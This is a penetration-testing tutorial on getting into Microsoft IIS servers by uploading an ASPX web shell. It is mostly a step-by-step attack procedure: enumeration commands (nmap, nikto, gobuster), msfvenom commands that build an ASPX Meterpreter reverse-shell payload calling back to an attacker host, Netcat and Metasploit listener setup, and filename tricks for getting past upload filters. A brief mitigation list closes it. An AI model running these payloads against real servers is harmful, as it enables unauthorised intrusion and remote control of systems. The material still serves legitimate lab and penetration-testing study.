# Introduction

Microsoft Internet Information Services (IIS) is Microsoft's web server used to host websites and web applications on Windows.

Many IIS servers allow users to upload files. If file upload restrictions are weak, attackers may upload an **ASPX Web Shell** and execute commands remotely.

This is one of the most common Windows web exploitation techniques and frequently appears in penetration testing labs.

---

# What is IIS?

IIS (Internet Information Services) is Microsoft's web server.

Common technologies hosted on IIS include:

- ASP
- ASP.NET
- ASPX
- C#
- VB.NET

Typical ports:

| Port | Service |
|-------|----------|
| 80 | HTTP |
| 443 | HTTPS |

---

# What is an ASPX Web Shell?

An ASPX Web Shell is a malicious ASP.NET page that allows attackers to execute Windows commands through a web browser.

Instead of exploiting a software vulnerability, the attacker abuses an insecure upload functionality.

Example workflow:

```
Upload ASPX File

↓

Browse to Shell

↓

Execute Commands

↓

Upload Payload

↓

Reverse Shell

↓

Privilege Escalation
```

---

# Attack Scenario


# Identifying IIS

Service detection:

```bash
nmap -sV TARGET
```

Example output:

```
80/tcp open http

Microsoft IIS 10.0
```

Retrieve HTTP headers:

```bash
curl -I http://TARGET
```

Example:

```
Server: Microsoft-IIS/10.0
```

---

# Enumerating IIS

Useful Nmap scripts:

```bash
nmap --script http-title TARGET
```

```bash
nmap --script http-headers TARGET
```

Nikto scan:

```bash
nikto -h http://TARGET
```

Directory enumeration:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting directories:

```
/uploads/

/images/

/admin/

/files/

/backup/
```

# Uploading an ASPX Web Shell

If unrestricted file upload is available:

Example file:

```
shell.aspx
```

Upload it through:

- File upload forms
- Admin panels
- CMS plugins
- WebDAV
- Vulnerable applications

After uploading:

```
http://TARGET/uploads/shell.aspx
```

If successful, the shell becomes accessible through the browser.

# Generating ASPX Payloads

Generate an ASPX Meterpreter payload:

```bash
msfvenom \
-p windows/x64/meterpreter/reverse_tcp \
LHOST=YOUR_IP \
LPORT=4444 \
-f aspx \
> shell.aspx
```

32-bit version:

```bash
msfvenom \
-p windows/meterpreter/reverse_tcp \
LHOST=YOUR_IP \
LPORT=4444 \
-f aspx \
> shell.aspx
```

Always match the payload architecture to the target system whenever possible.

# Obtaining a Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Upload the generated ASPX payload.

Browse to:

```
http://TARGET/uploads/shell.aspx
```

If successful:

```
Meterpreter session 1 opened
```

Or:

```
Connection received
```

# Using Metasploit

Start Metasploit:

```bash
msfconsole
```

Handler:

```text
use exploit/multi/handler
```

Payload:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Configure:

```text
set LHOST YOUR_IP

set LPORT 4444
```

Execute:

```text
run
```

Visit the uploaded ASPX file to trigger the payload.

# Common Mistakes

## Forgetting File Type Restrictions

Some upload forms only accept:

```
.jpg

.png

.pdf
```

Try bypass techniques only when authorized, such as:

```
shell.aspx.jpg

shell.asp;.jpg

shell.aspx%20

shell.aspx.
```

---

## Not Verifying Upload Location

After uploading:

Use Gobuster or browse manually to locate the uploaded file.

Common locations:

```
/uploads/

/files/

/images/
```

---

## Using the Wrong Payload Architecture

Always determine whether the target is:

- x64
- x86

Generate the correct payload.

---

## Ignoring WebDAV

Many IIS servers expose WebDAV.

Check:

```bash
davtest -url http://TARGET
```

WebDAV may allow direct upload of ASPX files.

---

# Defense & Mitigation

Protect IIS servers by:

- Restricting file uploads
- Validating file types server-side
- Disabling execution inside upload directories
- Removing WebDAV if unnecessary
- Applying the latest IIS updates
- Running IIS with least privilege
- Monitoring suspicious ASPX uploads
- Using antivirus and endpoint protection
